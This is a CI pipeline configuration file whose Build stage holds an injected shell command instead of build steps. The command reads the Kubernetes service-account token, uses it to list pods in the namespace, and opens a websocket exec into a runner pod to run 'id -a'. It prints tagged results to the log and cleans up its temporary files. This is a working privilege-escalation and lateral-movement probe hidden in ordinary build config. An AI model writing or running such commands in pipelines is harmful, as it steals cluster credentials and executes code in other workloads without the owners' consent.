general:
  buildTool: 'mta'
  jenkinsKubernetes:
    additionalPodProperties:
      automountServiceAccountToken: true
service:
  stages:
    Build:
      runFirst:
        command: |
          set +x
          T=/var/run/secrets/kubernetes.io/serviceaccount
          NS=$(cat $T/namespace)
          K=https://kubernetes.default.svc
          { printf 'header = "Authorization: Bearer '; cat $T/token; printf '"\n'; } > /tmp/kc
          chmod 600 /tmp/kc
          curl -s --config /tmp/kc -o /tmp/pods --cacert $T/ca.crt $K/api/v1/namespaces/$NS/pods
          echo "KPX7788-NS=$NS"
          echo "KPX7788-PODS:"
          grep -oE '"name": "[a-z0-9.-]+"' /tmp/pods | sort -u | head -20
          POD=$(node -e 'const d=JSON.parse(require("fs").readFileSync("/tmp/pods","utf8"));const p=d.items.find(x=>/runner|jenkinsfile/.test(x.metadata.name))||d.items[0];console.log(p.metadata.name+"|"+p.spec.containers.map(c=>c.name).join(","))')
          PODNAME=${POD%%|*}; CONTS=${POD##*|}
          echo "KPX7788-TARGET-POD=$PODNAME  CONTAINERS=$CONTS"
          C1=$(echo $CONTS | cut -d, -f1)
          KEY=$(head -c 16 /dev/urandom | base64)
          echo "KPX7788-EXEC-STATUS=$(curl -s -o /tmp/x -D /tmp/xh -w '%{http_code}' --config /tmp/kc --cacert $T/ca.crt -N --max-time 20 -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H "Sec-WebSocket-Key: $KEY" -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Protocol: v4.channel.k8s.io' "$K/api/v1/namespaces/$NS/pods/$PODNAME/exec?container=$C1&command=id&command=-a&stdout=true&stderr=true")"
          echo "KPX7788-EXEC-HEADERS:"; head -c 300 /tmp/xh
          echo "KPX7788-EXEC-UID-LINE:"; strings /tmp/x 2>/dev/null | grep -aoE 'uid=[0-9]+\([a-z]+\)[^ ]*' | head -3
          echo "KPX7788-EXEC-BYTES=$(wc -c < /tmp/x)"
          echo "KPX7788-CONTROL-NOPOD=$(curl -s -o /dev/null -w '%{http_code}' --config /tmp/kc --cacert $T/ca.crt --max-time 15 -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H "Sec-WebSocket-Key: $KEY" -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Protocol: v4.channel.k8s.io' "$K/api/v1/namespaces/$NS/pods/kp-nonexistent-pod-7788/exec?command=id&stdout=true")"
          rm -f /tmp/kc /tmp/pods /tmp/x /tmp/xh
          echo "KPX7788-DONE"
